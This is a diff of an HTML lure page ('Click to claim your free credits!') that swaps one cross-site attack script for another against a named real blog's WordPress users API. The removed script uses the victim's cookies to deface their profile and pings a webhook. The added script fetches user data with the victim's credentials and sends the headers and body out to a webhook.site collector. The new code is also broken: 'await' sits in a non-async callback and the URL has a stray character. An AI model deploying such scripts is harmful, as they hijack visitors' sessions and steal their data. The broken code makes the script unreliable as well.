@@ -5,22 +5,20 @@
 </head>
 <body>
   <h1>Click to claim your free credits!</h1>
-<script>
-// Change victim's profile data using THEIR cookies
-fetch('https://blog.arlo.com/wp-json/wp/v2/users/', {
-  method: 'POST',  // Change from GET to POST to allow the body
-  credentials: 'include',
-  headers: {
-    'Content-Type': 'application/json',
-    'Origin': 'https://evil.com'
-  },
-  body: JSON.stringify({
-    description: 'Hacked by Bestie!'  // The data you're sending
-  })
-}).then(r => {
-  // Confirm exploit via webhook
-  fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73?status=' + r.status);
-});
-</script>
+<script>  
+fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
+  credentials: 'include'  
+})  
+.then(r => {  
+  // Send FULL request headers to your server (includes cookies!)  
+  fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73l', {  
+    method: 'POST',  
+    body: JSON.stringify({  
+      headers: [...r.headers.entries()],  
+      data: await r.text()  
+    })  
+  });  
+});  
+</script>  
 </body>
 </html>
